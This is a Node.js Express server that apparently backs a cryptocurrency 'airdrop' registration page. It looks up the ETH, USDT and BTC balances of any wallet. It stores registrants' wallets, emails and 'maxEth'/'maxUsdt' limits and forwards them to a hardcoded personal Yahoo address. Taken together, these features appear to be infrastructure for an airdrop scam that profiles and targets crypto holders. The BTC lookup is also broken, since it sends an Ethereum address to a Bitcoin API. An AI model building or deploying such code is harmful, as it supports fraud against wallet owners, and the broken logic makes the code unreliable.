const express = require('express');
const mongoose = require('mongoose');
const nodemailer = require('nodemailer');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const csrf = require('csurf');
const cookieParser = require('cookie-parser');
const axios = require('axios');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(cookieParser());
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "https://cdn.ethers.io"],
        connectSrc: ["'self'", "https://api.etherscan.io"],
      },
    },
  })
);
app.use(rateLimit({ windowMs: 15 * 60 * 1000, limit: 100 }));
const csrfProtection = csrf({ cookie: true });
app.use(csrfProtection);

// MongoDB Connection
mongoose.connect(process.env.DATABASE_URL, { useNewUrlParser: true, useUnifiedTopology: true })
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('MongoDB connection error:', err));

// User Schema
const userSchema = new mongoose.Schema({
  wallet: { type: String, required: true, unique: true },
  email: { type: String, required: true },
  maxEth: { type: Number },
  maxUsdt: { type: Number },
  timestamp: { type: Date, default: Date.now }
});
const User = mongoose.model('User', userSchema);

// Nodemailer Configuration
const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.EMAIL_USER,
    pass: process.env.EMAIL_PASS
  }
});

const ETHERSCAN_API_KEY = process.env.ETHERSCAN_API_KEY;
const BLOCKCHAIN_API_URL = 'https://blockchain.info';

// Routes
app.get('/check-balances', async (req, res) => {
  const { address } = req.query;
  const walletRegex = /^0x[a-fA-F0-9]{40}$/;
  if (!walletRegex.test(address)) {
    return res.status(400).json({ message: 'Invalid wallet address.' });
  }

  try {
    const ethResponse = await axios.get('https://api.etherscan.io/api', {
      params: { module: 'account', action: 'balance', address, tag: 'latest', apikey: ETHERSCAN_API_KEY }
    });
    const ethBalance = ethResponse.data.result / 1e18;

    const usdtContract = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
    const usdtResponse = await axios.get('https://api.etherscan.io/api', {
      params: { module: 'account', action: 'tokenbalance', contractaddress: usdtContract, address, tag: 'latest', apikey: ETHERSCAN_API_KEY }
    });
    const usdtBalance = usdtResponse.data.result / 1e6;

    const btcResponse = await axios.get(`${BLOCKCHAIN_API_URL}/rawaddr/${address}`).catch(() => ({ data: { final_balance: 0 } }));
    const btcBalance = btcResponse.data.final_balance / 1e8;

    res.json({
      eth: ethBalance.toFixed(4),
      usdt: usdtBalance.toFixed(2),
      btc: btcBalance.toFixed(8)
    });
  } catch (error) {
    console.error('Balance check error:', error.message);
    res.status(500).json({ message: 'Error fetching balances.' });
  }
});

app.get('/csrf-token', (req, res) => {
  try {
    res.json({ token: req.csrfToken() });
  } catch (error) {
    res.status(500).json({ message: 'Error generating CSRF token.' });
  }
});

app.post('/submit', async (req, res) => {
  const { wallet, email, maxEth, maxUsdt } = req.body;
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
  const walletRegex = /^0x[a-fA-F0-9]{40}$/;

  if (!walletRegex.test(wallet)) return res.status(400).json({ message: 'Invalid wallet address.' });
  if (!emailRegex.test(email)) return res.status(400).json({ message: 'Invalid email address.' });

  try {
    const existingUser = await User.findOne({ wallet });
    if (existingUser) return res.status(400).json({ message: 'Wallet already registered.' });

    const newUser = new User({ wallet, email, maxEth, maxUsdt });
    await newUser.save();

    const mailOptions = {
      from: process.env.EMAIL_USER,
      to: 'pouya.mafia@yahoo.com',
      subject: 'New Airdrop Registration',
      text: `Wallet: ${wallet}\nEmail: ${email}\nMax ETH: ${maxEth}\nMax USDT: ${maxUsdt}\nTimestamp: ${new Date().toISOString()}`
    };

    await transporter.sendMail(mailOptions);
    res.json({ message: 'Data successfully submitted and emailed!' });
  } catch (error) {
    console.error('Submit error:', error.message);
    res.status(500).json({ message: 'Server error occurred.' });
  }
});

app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
});

// Start Server
app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});